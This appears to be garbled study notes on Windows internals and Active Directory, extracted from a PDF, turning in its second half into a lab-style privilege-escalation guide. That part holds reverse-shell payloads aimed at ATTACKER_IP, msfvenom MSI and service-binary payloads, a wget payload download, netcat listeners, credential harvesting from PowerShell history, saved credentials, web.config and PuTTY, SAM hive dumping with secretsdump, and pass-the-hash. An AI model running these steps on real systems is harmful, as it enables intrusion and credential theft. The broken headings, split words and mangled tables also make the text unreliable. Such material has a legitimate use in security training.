HKLM\Software\Microsoft\Internet Explorer\Extensions HKLM\Software\Microsoft\Internet Explorer\Toolbar HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
### Per-user and systemwide ASEPs in the registry—64-bit only

### HKCU\Software\Wow6432Node\Microsoft\Internet Explorer\Explorer Bars

HKCU\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions
### HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Explorer Bars

HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Toolbar HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Br
### owser Helper Objects

The following list specifies the registry keys that are shown on the Winlogon tab. Per-user specification of the screen saver HKCU\Control Panel\Desktop\Scrnsave.exe
### Per-user specification of the screen saver, controlled by Group Policy

H K C U \ S o f t w a r e \ P o l i c i e s \ M i c r o s o f t \ W i n d o w s \ C o n t r o l Panel\Desktop\Scrnsave.exe
### Group Policy Client-Side Extensions (CSEs)

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions H K L M \ S o f t w a r e \ W o w 6 4 3 2 N o d e \ M i c r o s o f t \ W i n d o w s NT\CurrentVersion\Winlogon\GPExtensions
### Credential provider ASEPs

HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\Credential
### Provider Filters

HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\PLAP Providers
### Systemwide identification of a program to verify successful boot

HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath ASEP for custom setup and deployment tasks HKLM\System\Setup\CmdLine
### (This ASEP isn’t truly related to the LSA, except that,

### like the LSA, it represents security-related functionality.)

### Keys inspected for Authentication Providers

### HKLM\System\CurrentControlSet\Control\Lsa\Authentication Packages

### HKLM\System\CurrentControlSet\Control\Lsa\Notification Packages

### HKLM\System\CurrentControlSet\Control\Lsa\Security Packages

### HKLM\System\CurrentControlSet\Control\Lsa\OSConfig\Security Packages

### Keys inspected for Registered Cryptographic Providers

HKLM\System\CurrentControlSet\Control\SecurityProviders\SecurityProviders
### The Office tab lists add-ins and plug-ins registered to hook into documented

### interfaces for Access, Excel, Outlook, PowerPoint, and Word. On 64-bit

### Windows, Office add-ins can be registered to run in 32-bit or 64-bit Office

versions. 32-bit add-ins are registered in Wow6432Node subkeys on 64-bit Windows. Keys inspected under both HKLM and HKCU \Software\Microsoft\Office\Access\Addins \Software\Microsoft\Office\Excel\Addins \Software\Microsoft\Office\Outlook\Addins \Software\Microsoft\Office\PowerPoint\Addins \Software\Microsoft\Office\Word\Addins
### Keys inspected under both HKLM and HKCU on 64-bit Windows

\Software\Wow6432Node\Microsoft\Office\Access\Addins \Software\Wow6432Node\Microsoft\Office\Excel\Addins \Software\Wow6432Node\Microsoft\Office\Outlook\Addins \Software\Wow6432Node\Microsoft\Office\PowerPoint\Addins \Software\Wow6432Node\Microsoft\Office\Word\Addins
### Registry locations inspected for EXE file hijacks

HKCU\Software\Classes\Exefile\Shell\Open\Command\(Default) HKCU\Software\Classes\.exe
HKCU\Software\Classes\.cmd HKLM\Software\Classes\Exefile\Shell\Open\Command\(Default) HKLM\Software\Classes\.exe HKLM\Software\Classes\.cmd
### Registry locations inspected for htmlfile hijacks

### HKCU\Software\Classes\Htmlfile\Shell\Open\Command\(Default)

HKLM\Software\Classes\Htmlfile\Shell\Open\Command\(Default)
### Command processor autorun keys

HKCU\Software\Microsoft\Command Processor\Autorun HKLM\Software\Microsoft\Command Processor\Autorun HKLM\Software\Wow6432Node\Microsoft\Command Processor\Autorun
### Keys inspected for Image File Execution Options hijacks

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
### Windows & Microsoft Azure Fundamentals

### The Sysinternals web site was created in 1996 by Mark Russinovich to host his

advanced system utilities and technical information. Whether you’re an IT Pro or a developer, you’ll find Sysinternals utilities to help you manage, troubleshoot and diagnose your Windows systems and applications. https://docs.microsoft.com/en-us/
### sysinternals/

### The Windows application programming interface (API) is the user-mode system

programming interface to the Windows OS family . %SystemDrive%/hiberfil.sys
### hiberﬁl.sys, better known as the Windows hibernation ﬁle contains a compressed

### memory image from the previous boot. Microsoft Windows systems use this in

order to provide faster boot-up times, however, we can use this file in our case
### for some memory forensics

### On Windows, the password hash is normally stored in the SAM ﬁle at

%SystemRoot%\System32\config. C:\Windows\System32\config The web directories sit at C:\xampp\htdocs, which is common for an XAMPP deployment on Windows. There is an inetpub directory at the root of C:\. That’s the directory IIS typically runs from
powershell -ep bypass -> load a powershell shell with execution policy bypassed DLLs are shared system libraries utilized in system processes. These are commonly subjected to hijacking and other side-loading attacks, making them a key target for forensics.
### The ﬁle system used in modern versions of Windows is the New Technology File

### System or simply NTFS. Before NTFS, there was FAT16/FAT32 (File Allocation

Table) and HPFS (High Performance File System). NTFS is known as a journaling file system. In case of a failure, the file system can automatically repair the folders/files on disk using information stored in a log file. This function is not possible with FAT.
### "Trusted Platform Module (TPM) technology is designed to provide hardware-

based, security-related functions. A TPM chip is a secure crypto-processor that is designed to carry out cryptographic operations. The chip includes multiple physical security mechanisms to make it tamper-resistant, and malicious software is unable to tamper with the security functions of the TPM".
### BitLocker Drive Encryption is a data protection feature that integrates with the

### operating system and addresses the threats of data theft or exposure from lost,

stolen, or inappropriately decommissioned computers". On devices with TPM installed, BitLocker offers the best protection.
### Per Microsoft, "BitLocker provides the most protection when used with a Trusted

### Platform Module (TPM) version 1.2 or later. The TPM is a hardware component

### installed in many newer computers by the computer manufacturers. It works with

### BitLocker to help protect user data and to ensure that a computer has not been

### tampered with while the system was ofﬂine"

Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System).
### Every ﬁle has at least one data stream ($DATA), and ADS allows ﬁles to contain

### more than one stream of data. Natively Window Explorer doesn't display ADS to

the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files. In this system a file is built up from a couple of attributes, one of them is $Data, aka the data attribute. Looking at the regular data stream of a text file there is no mystery. It simply contains the text inside the text file. But that is only the
### primary data stream which is sometimes referred to as the unnamed data stream

since the name string of this attribute is empty ( “” ) . So any data stream that has a name is considered alternate.
### Syntax for using powershell to read ADS streams >>

### Get-Item -path {path to ﬁle} -stream {name of stream}

### Syntax for using powershell to add streams to a ﬁle >>

### Set-Item -path {path to ﬁle} -stream {name of stream}

### Syntax for using powershell to remove ADS from a ﬁle >>

### Remove-Item -path {path to ﬁle} -stream {name of stream}

If you want to search a directory or drive for ADS you can use this command in
### the root of the target:

### gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'

Local User and Group Management >> Right-click on the Start Menu and click
### Run. Type lusrmgr.msc

### User Account Control (UAC) is a fundamental component of Microsoft's overall

security vision. UAC helps mitigate the impact of malware.
### The System Conﬁguration utility/panel (MSConﬁg) is for advanced

troubleshooting, and its main purpose is to help diagnose startup issues. https://
### docs.microsoft.com/en-us/troubleshoot/windows-client/performance/system-

### conﬁguration-utility-troubleshoot-conﬁguration-errors

### The normal startup option is the Windows default. This option enables Windows to

start in normal mode together with all programs, services, and device drivers loaded.
### The diagnostic startup option enables Windows to determine which basic device

### drivers and software to load when you start Windows. When you use this option,

the system temporarily disables some Microsoft services.
### The selective startup option enables you to select the programs and services

that you want the computer to load when you restart the computer. You can
### select from the following options:

### Load system services, Load startup items, Use original boot conﬁguration

### Below are tools available through the System Conﬁguration

### The Computer Management (compmgmt) utility has three primary sections:

System Tools, Storage, and Services and Applications. WMI Control configures and controls the Windows Management Instrumentation (WMI) service. "WMI allows scripting languages (such as VBScript or Windows PowerShell) to
### manage Microsoft Windows personal computers and servers, both locally and

### remotely. Microsoft also provides a command-line interface to WMI called

### Windows Management Instrumentation Command-line (WMIC)."

Note: The WMIC tool is deprecated in Windows 10, version 21H1. Windows PowerShell supersedes this tool for WMI.
### System Information (msinfo32) tool "Windows includes a tool called Microsoft

### System Information (Msinfo32.exe).  This tool gathers information about your

### computer and displays a comprehensive view of your hardware, system

components, and software environment, which you can use to diagnose computer issues." Environment variables store information about the operating system environment.
### This information includes details such as the operating system path, the number

of processors used by the operating system, and the location of temporary folders.
### The environment variables store data that is used by the operating system and

### other programs. For example, the WINDIR environment variable contains the

### location of the Windows installation directory. Programs can query the value of

### this variable to determine where Windows operating system ﬁles are located"

### Resource Monitor (resmon) "Resource Monitor displays per-process and aggregate

CPU, memory, disk, and network usage information, in addition to providing details
### about which processes are using individual ﬁle handles and modules. Advanced

filtering allows users to isolate the data related to one or more processes (either
### applications or services), start, stop, pause, and resume services, and close

### unresponsive applications from the user interface. It also includes a process

### analysis feature that can help identify deadlocked processes and ﬁle locking

conflicts so that the user can attempt to resolve the conflict instead of closing an application and potentially losing data."
### Windows Command Prompt (cmd.exe)

Unlike Unix Based Systems, the man page for Windows CMD commands can be
### accessed using {cmd} /? Or {cmd} help

### An A-Z Index of Windows CMD commands https://ss64.com/nt/

### The Windows Registry (regedit) or reg /? at the Command Prompt more at >>

https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/
### windows-registry-advanced-users

is a central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices. The registry contains information that Windows continually references during
### operation, such as:

### Proﬁles for each user, Applications installed on the computer and the types of

### documents that each can create, Property sheet settings for folders and

application icons, What hardware exists on the system, The ports that are being used.
### There are various ways to view/edit the registry. One way is to use the Registry

### Editor (regedit). A registry hive is a group of keys, subkeys, and values in the

registry that has a set of supporting files that contain backups of its data. https://microsoft.fandom.com/wiki/Windows_Registry List of Main Windows Registry Hives and Their Abbreviations:
## Hklm - Hkey_Local_Machine

### Stores settings that are specific to the local computer. This hive

### contains information about the hardware, software, and preferences on

the system. It affects all users on the computer.
## Hkcu - Hkey_Current_User

### Contains configuration information for Windows and software settings

specific to the currently logged-in user. Each user on the system has their own HKCU hive.
## Hkcr - Hkey_Classes_Root

### A subset of HKLM\Software and HKCU\Software combined. It includes

### information about registered applications, such as file associations and

### OLE Object Class IDs. This helps Windows determine which programs to

run when a specific type of file is accessed.
## Hku - Hkey_Users

### Contains all the user profiles loaded on the machine. HKCU is actually a

subkey of HKU, representing the current user profile in use.
## Hkcc - Hkey_Current_Config

### Contains information gathered at runtime; data stored here is not

### permanently stored on disk, but rather generated at boot time. It relates

to the configuration of the PC's hardware.
### What is Active Directory? -

### Windows domain is a group of users and computers under the administration of

a given business. The main idea behind a domain is to centralise the administration
### of common components of a Windows computer network in a single repository

called Active Directory (AD). The server that runs the Active Directory services is known as a Domain Controller (DC). Active Directory is a collection of machines and servers connected inside of
### domains, that are a collective part of a bigger forest of domains, that make up

### the Active Directory network. Why use Active Directory? - Microsoft's Active

### Directory is the backbone of the corporate world. It simpliﬁes the management

of devices and users within a corporate environment.
### The majority of large companies use Active Directory because it allows for the

### control and monitoring of their user's computers through a single domain

### controller. It allows a single user to sign in to any computer on the active

### directory network and have access to his or her stored ﬁles and folders in the

server, as well as the local storage on that machine. This allows for any user in
### the company to use any machine that the company owns, without having to set up

multiple users on a machine. Active Directory does it all for you.
### The physical Active Directory is the servers and machines on-premise, these can

### be anything from domain controllers and storage servers to domain user

machines; everything needed for an Active Directory environment besides the software. AD DS is a true directory service, with a hierarchical X.500-based structure. AD DS uses Domain Name System (DNS) for locating resources such as domain controllers. You can query and manage AD DS by using Lightweight Directory Access Protocol (LDAP) calls. AD DS primarily uses the Kerberos protocol for authentication. AD DS uses OUs and GPOs for management. AD DS includes computer objects, representing computers that join an Active Directory domain. AD DS uses trusts between domains for delegated management.
### A Domain Controller is a Windows server that has Active Directory Domain

### Services (AD DS) installed and has been promoted to a domain controller in the

forest. Domain controllers are the center of Active Directory -- they control the rest of the domain. Outlined below are the tasks of a domain controller:
### holds the AD DS data store

### handles authentication and authorization services

### replicate updates from other domain controllers in the forest

### Allows admin access to manage domain resources

### AD DS Data Store - The Active Directory Data Store holds the databases and

### processes needed to store and manage directory information such as users,

### groups, and services. The AD DS Data Store Contains the NTDS.dit - a database

### that contains all of the information of an Active Directory domain controller as

well as password hashes for domain users >> Stored by default in %SystemRoot%
### \NTDS and accessible only by the domain controller

### The core of any Windows Domain is the Active Directory Domain Service (AD

### DS). This service acts as a catalogue that holds the information of all of the

### "objects" that exist on your network. Amongst the many objects supported by

AD, we have users, groups, machines, printers, shares and many others. A Forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole
### consists of these parts such as

### Trees - A hierarchy of domains in Active Directory Domain Services

### Domains - Used to group and manage objects

Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
### Trusts - Allows users to access resources in other domains

### Objects - users, groups, printers, computers, shares

### Domain Services - DNS Server, LLMNR, IPv6, Http, LDAP

### Domain Schema - Rules for AD-object creation

### Trusts are a mechanism in place for users in the network to gain access to other

### resources in the domain. For the most part, trusts outline the way that the

domains inside of a forest communicate to each other, in some environments trusts
### can be extended out to external domains and even forests in some cases. When

### attacking an Active Directory environment you can sometimes abuse these trusts

in order to move laterally throughout the network. There are two types of trusts that determine how the domains communicate. I'll
### outline the two types of trusts below:

Directional - The direction of the trust flows from a trusting domain to a
### trusted domain

Transitive - The trust relationship expands beyond just two domains to include
### other trusted domains

### Users are the core to Active Directory; The four types of users are:

Domain Admins - They control the domains and are the only ones with access to the domain controller.
### *Service Accounts (Can be Domain Admins) - These are for the most part never

### used except for service maintenance, they are required by Windows for services

### such as SQL to pair a service with a service account

### Local Administrators - These users can make changes to local machines as an

administrator and may even be able to control other normal users, but they cannot access the domain controller
### Domain Users - These are your everyday users. They can log in on the

### machines they have the authorization to access and may have local administrator

rights to machines depending on the organization.
### Organizational Units are handy for applying policies to users and computers,

### which include speciﬁc conﬁgurations that pertain to sets of users depending on

their particular role in the enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn't make sense to try to apply two different sets of policies to a single user.
### Policies are a very big part of Active Directory, they dictate how the server

### operates and what rules it will and will not follow. You can think of domain

policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a
### whole. They simply act as a rulebook for Active  Directory that a domain admin

can modify and alter as they deem necessary to keep the network running smoothly and securely.
### Windows manages such policies through Group Policy Objects (GPO). GPOs are

### simply a collection of settings that can be applied to OUs. GPOs can contain

### policies aimed at either users or computers, allowing you to set a baseline on

### speciﬁc machines and identities. To conﬁgure GPOs, you can use the Group Policy

Management tool, available from the start menu.
### Groups make it easier to give resource permissions to users and objects by

### organizing them into groups with speciﬁed permissions. There are two overarching

### types of Active Directory groups and a Default set of Security Groups

### Security Groups - are used to grant permissions over resources. For example, you

### will use groups if you want to allow some users to access a shared folder or

network printer. A user can be a part of many groups, which is needed to grant access to multiple resources. Distribution Groups - These groups are used to specify email distribution lists.
### Default Security Groups - Here is a brief outline of the security groups:

### GPOs are distributed to the network via a network share called SYSVOL, which is

stored in the DC. All users in a domain should typically have access to this share
### over the network to sync their GPOs periodically. The SYSVOL share points by

default to the C:\Windows\SYSVOL\sysvol\ directory on each of the DCs in our network.
### Once a change has been made to any GPOs, it might take up to 2 hours for

### computers to catch up. If you want to force any particular computer to sync its

GPOs immediately, you can always run the following command on the desired computer:
Windows PowerShell Syntax >> PS C:\> gpupdate /force
### Authentication Methods

When using Windows domains, all credentials are stored in the Domain Controllers.
### Whenever a user tries to authenticate to a service using domain credentials, the

service will need to ask the Domain Controller to verify if they are correct. Two
### protocols can be used for network authentication in windows domains:

### Kerberos: Used by any recent version of Windows. This is the default protocol

### in any recent domain. Kerberos authentication is the default authentication

### protocol for any recent version of Windows. Users who log into a service using

### Kerberos will be assigned tickets. Think of tickets as proof of a previous

### authentication. Users with tickets can present them to a service to demonstrate

they have already authenticated into the network before and are therefore enabled to use it. NetNTLM: Legacy authentication protocol kept for compatibility purposes. NetNTLM works using a challenge-response mechanism.
### “ A new security group needs to be introduced when talking about trees and

### forests. The Enterprise Admins group will grant a user administrative privileges

### over all of an enterprise's domains. Each domain would still have its Domain

Admins with administrator privileges over their single domains and the Enterprise
### Admins who can control everything in the enterprise. “

### The simplest trust relationship that can be established is a one-way trust

### relationship. In a one-way trust, if Domain AAA trusts Domain BBB, this means

### that a user on BBB can be authorised to access resources on AAA, NOTE: The

direction of the one-way trust relationship is contrary to that of the access direction.
### Two-way trust relationships can also be made to allow both domains to mutually

### authorise users from the other. By default, joining several domains under a tree

or a forest will form a two-way trust relationship.
### It is important to note that having a trust relationship between domains doesn't

### automatically grant access to all resources on other domains. Once a trust

### relationship is established, you have the chance to authorise users across

different domains, but it's up to you what is actually authorised or not.
Domain Controllers - All domain controllers in the domain Domain Guests - All domain guests
### Domain Users - All domain users

Domain Computers - All workstations and servers joined to
### the domain

### Domain Admins - Designated administrators of the domain

Enterprise Admins - Designated administrators of the
### enterprise

Schema Admins - Designated administrators of the schema
### DNS Admins - DNS Administrators Group

### DNS Update Proxy - DNS clients who are permitted to

perform dynamic updates on behalf of some other clients (such as DHCP servers).
### Allowed RODC Password Replication Group - Members in this

group can have their passwords replicated to all read-only
### domain controllers in the domain

Group Policy Creator Owners - Members in this group can
### modify group policy for the domain

### Denied RODC Password Replication Group - Members in this

group cannot have their passwords replicated to any read-only
### domain controllers in the domain

### Protected Users - Members of this group are afforded

additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information. Cert Publishers - Members of this group are permitted to
### publish certiﬁcates to the directory

### Read-Only Domain Controllers - Members of this group are

### Read-Only Domain Controllers in the domain

### Enterprise Read-Only Domain Controllers - Members of this

group are Read-Only Domain Controllers in the enterprise
### Key Admins - Members of this group can perform

administrative actions on key objects within the domain.
### Enterprise Key Admins - Members of this group can perform

administrative actions on key objects within the forest. Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned. RAS and IAS Servers - Servers in this group can access remote access properties of users
### Windows Users && Privilege Escalation

### Windows systems mainly have two kinds of users. Depending on their access

### levels, we can categorise a user in one of the following groups:

### Administrators These users have the most privileges. They can change any system

configuration parameter and access any file in the system.
### Standard UsersThese users can access the computer but only perform limited

tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.
### In addition to that, you will usually hear about some special built-in accounts

used by the operating system in the context of privilege escalation:
### SYSTEM / LocalSystem

### An account used by the operating system to perform internal tasks. It has

full access to all files and resources available on the host with even higher privileges than administrators.
### Local Service

### Default account used to run Windows services with "minimum" privileges. It

will use anonymous connections over the network.
### Network Service

### Default account used to run Windows services with "minimum" privileges. It

will use the computer credentials to authenticate through the network.
### These accounts are created and managed by Windows, and you won't be able to

use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.
### Unattended Windows Installations

### When installing Windows on a large number of hosts, administrators may use

### Windows Deployment Services, which allows for a single operating system image

to be deployed to several hosts through the network. These kinds of installations
are referred to as unattended installations as they don't require user interaction.
### Such installations require the use of an administrator account to perform the

initial setup, which might end up being stored in the machine in the following locations: C:\Unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml
### Powershell History

### Whenever a user runs a command using Powershell, it gets stored into a ﬁle that

### keeps a memory of past commands. This is useful for repeating commands you

### have used before quickly. If a user runs a command that includes a password

### directly as part of the Powershell command line, it can later be retrieved by

using the following command from a cmd.exe prompt:
### type %userproﬁle%

\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_h
### istory.txt

### Note: The command above will only work from cmd.exe, as Powershell won't

### recognize %userproﬁle% as an environment variable. To read the ﬁle from

Powershell, you'd have to replace %userprofile% with $Env:userprofile.
### Saved Windows Credentials

### Windows allows us to use other users' credentials. This function also gives the

option to save these credentials on the system. The command below will list saved credentials: cmdkey /list
### While you can't see the actual passwords, if you notice any credentials worth

trying, you can use them with the runas command and the /savecred option, as seen below. runas /savecred /user:InsertUsername cmd.exe.
### IIS Conﬁguration

### Internet Information Services (IIS) is the default web server on Windows

### installations. The conﬁguration of websites on IIS is stored in a ﬁle called

### web.conﬁg and can store passwords for databases or conﬁgured authentication

mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations: C:\inetpub\wwwroot\web.config C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config Here is a quick way to find database connection strings on the file syntax:
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
### | ﬁndstr connectionString

### Retrieve Credentials from Software: PuTTY

### PuTTY is an SSH client commonly found on Windows systems. Instead of having to

### specify a connection's parameters every single time, users can store sessions

### where the IP, user and other conﬁgurations can be stored for later use. While

### PuTTY won't allow users to store their SSH password, it will store proxy

configurations that include cleartext authentication credentials.
### To retrieve the stored proxy credentials, you can search under the following

### registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
### Note: Simon Tatham is the creator of PuTTY (and his name is part of the path),

### not the username for which we are retrieving the password. The stored proxy

username should also be visible after running the command above.
### Just as putty stores credentials, any software that stores passwords, including

### browsers, email clients, FTP clients, SSH clients, VNC software and others, will

have methods to recover any passwords the user has saved.
### Scheduled Tasks

### Looking into scheduled tasks on the target system, you may see a scheduled task

that either lost its binary or it's using a binary you can modify.
### Scheduled tasks can be listed from the command line using

### the “schtasks” command without any options. To retrieve detailed information

### about any of the services, you can use a command like the following one:

Command Prompt Syntax >> schtasks /query /tn vulntask /fo list /v
### You will get lots of information about the task, but what matters for us is the

### "Task to Run" parameter which indicates what gets executed by the scheduled

task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
### If our current user can modify or overwrite the "Task to Run" executable, we can

### control what gets executed by the that user, resulting in a simple privilege

escalation. To check the file permissions on the executable, we use “icacls” command
### If the result shows that the BUILTIN\Users group has full access (F) over the

task's binary. This means we can modify the file and insert any payload we like to spawn a reverse shell:
### Payload Command Prompt Syntax

echo PAYLOAD_FILE.exe -e cmd.exe ATTACKER_IP PORT > C:\
## {Path_To_File}

We then start a listener on the attacker machine on the same port we indicated
### on our reverse shell: nc -lvp 4444

### The next time the scheduled task runs, you should receive the reverse shell with

that Users privileges. While you probably wouldn't be able to start the task in a
### real scenario and would have to wait for the scheduled task to trigger, we have

### provided your user with permissions to start the task manually to save you some

### time. We can run the task with the following command:

Command Prompt Syntax >> schtasks /run /tn vulntask
### Abusing AlwaysInstallElevated Reg Policy

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it.
### However, these can be conﬁgured to run with higher privileges from any user

### account (even unprivileged ones). This could potentially allow us to generate a

malicious MSI file that would run with admin privileges.
### Note: This method requires two registry values to be set. You can query these

from the command line using the commands below.
### Command Prompt syntax for enabling ALWAYSINSTALLELEVATED POLICY

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can move to generate a malicious .msi file using msfvenom.
### msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP

### LPORT=ATTACKING_PORT -f msi -o malicious.msi

### Once you have transferred the ﬁle you have created(i.e using python webServer),

you can run the installer with the command below and receive the reverse shell:
### Command Prompt

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi Note: As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.
### Windows Services

### Windows services are managed by the Service Control Manager (SCM). The SCM

### is a process in charge of managing the state of services as needed, checking the

current status of any given service and generally providing a way to configure services.
### Each service on a Windows machine will have an associated executable which will

### be run by the SCM whenever a service is started. It is important to note that

### service executables implement special functions to be able to communicate with

the SCM, and therefore not any executable can be started as a service
successfully. Each service also specifies the user account under which the service will run.
### To better understand the structure of a service, let's check the apphostsvc

### service conﬁguration with the sc qc command:

Command Prompt Syntax for using Service Control (SC) with Query option
### C:\> sc qc serviceName

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
### From the results, see that the associated executable is speciﬁed through the

### BINARY_PATH_NAME parameter, and the account used to run the service is

### shown on the SERVICE_START_NAME parameter.Services also have a

### Discretionary Access Control List (DACL), which indicates who has permission to

### start, stop, pause, query status, query conﬁguration, or reconﬁgure the service,

### amongst other privileges. All of the services conﬁgurations are stored on the

### registry under HKLM_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\

A subkey exists for every service in the system. Again, we can see the associated
### executable on the ImagePath value and the account used to start the service on

### the ObjectName value. If a DACL has been conﬁgured for the service, it will be

### stored in a subkey called Security. As you have guessed by now, only

administrators can modify such registry entries by default.
### Insecure Permissions on Service Executable

### Using ICALS command to check permissions. If the executable associated with a

### service has weak permissions(i.e modify permissions (M) on the service's

executable) that allow an attacker to modify or replace it, the attacker can gain
### the privileges of the service's account User used to start it. Using MSFVenom

### generate a generate an exe-service payload using msfvenom and serve it through

### a python webserver,  Restart the service and Listen for connection using

Metasploit default Multi/Handler or Netcat.
### Kali Linux

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP
### LPORT=4445 -f exe-service -o rev-svc.exe

### We can then pull the payload from Powershell with the following command:

### wget http://ATTACKER_IP:8080/rev-svc.exe -O rev-svc.exe

Once the payload is in the Windows server, we proceed to replace the service executable with our payload
### Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
### When working with Windows services, a very particular behaviour occurs when

### the service is conﬁgured to point to an "unquoted" executable. By unquoted, we

mean that the path of the associated executable isn't properly quoted to account for spaces on the command. As an example, let's look at the difference between two services. The first service will use a proper quotation so that the SCM knows without a doubt that it has to
### execute the binary ﬁle pointed by

BINARY_PATH_NAME: "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service VS BINARY_PATH_NAME: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe Command Argument 1 Argument 2 \MyPrograms\Disk.e Sorter Enterprise\bin\disks rs.exe C:\MyPrograms\Disk Sorter.exe Enterprise\bin\disks rs.exe C:\MyPrograms\Disk Sorter Enterprise\bin\disks rs.exe
### When the SCM tries to execute the associated binary, a problem arises. Since

### there are spaces on the name of the "Disk Sorter Enterprise" folder, the

command becomes ambiguous, and the SCM doesn't know which of the following
### you are trying to execute

### This has to do with how the command prompt parses a command. Usually, when

### you send a command, spaces are used as argument separators unless they are

### part of a quoted string. This means the "right" interpretation of the unquoted

command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.
### Instead of failing as it probably should, SCM tries to help the user and starts

### searching for each of the binaries in the order shown in the table:

First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable. If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
### If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter

Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.
### From this behaviour, the problem becomes evident. If an attacker creates any of

### the executables that are searched for before the expected service executable,

they can force the service to run an arbitrary executable.
### Insecure Service Permissions

### You might still have a slight chance of taking advantage of a service if the

### service's executable DACL is well conﬁgured, and the service's binary path is

rightly quoted. Should the service DACL (not the service's executable DACL) allow
### you to modify the conﬁguration of a service, you will be able to reconﬁgure the

### service. This will allow you to point to any executable you need and run it with

any account you prefer, including SYSTEM itself.
### To check for a service DACL from the command line, you can use Accesschk(As a

### part of ensuring that they've created a secure environment Windows

### administrators often need to know what kind of accesses speciﬁc users or groups

### have to resources including ﬁles, directories, Registry keys, global objects and

### Windows services. AccessChk quickly answers these questions with an intuitive

interface and output. https://docs.microsoft.com/en-us/sysinternals/downloads/ accesschk) from the Sysinternals suite. Syntax: AccessChk.exe -qlc ServiceNameTobeQueried
### Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks.
### These tasks can be as simple as the privilege to shut down the machine up to

privileges to bypass some DACL-based access controls. Each user has a set of assigned privileges that can be checked with the following
### command: You can check your own privileges with “whoami /priv”. Disabled

### privileges are as good as enabled ones. The only important thing is if you have

the privilege on the list or not. A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that
### allow us to escalate in the system are of interest. You can ﬁnd a comprehensive

list of exploitable privileges on the https://github.com/gtworek/Priv2Admin
### SeBackup / SeRestore

### The SeBackup and SeRestore privileges allow users to read and write to any ﬁle

### in the system, ignoring any DACL in place. The idea behind this privilege is to

allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an attacker can trivially escalate privileges on the system by
### using many techniques. The one we will look at consists of copying the SAM and

### SYSTEM registry hives to extract the local Administrator's password hash

Note: Users accounts in "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges.
1. check priviliges >> Whoami /priv
### To backup the SAM and SYSTEM hashes, we can use the following commands:

C:\> reg save hklm\system C:\Users\Username\system.hive The operation completed successfully. C:\> reg save hklm\sam C:\Users\Username\sam.hive The operation completed successfully.
### This will create a couple of ﬁles with the registry hives content. We can now

copy these files to our attacker machine using SMB or any other available method.
### Use impacket to retrieve the users' password hashes

python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system
### system.hive LOCAL

### Dumping local SAM hashes (uid:rid:lmhash:nthash) ... for all users

### Grab the Administrator hash, use the Administrator's hash to perform a Pass-

### the-Hash attack and gain access to the target machine with SYSTEM privileges:

python3.9 /opt/impacket/examples/psexec.py -hashes Admin_hash{nt:lm} Administrator@Target_IP
### SeTakeOwnership

### The SeTakeOwnership privilege allows a user to take ownership of any object on

the system, including files and registry keys, opening up many possibilities for an
### attacker to elevate privileges, as we could, for example, search for a service

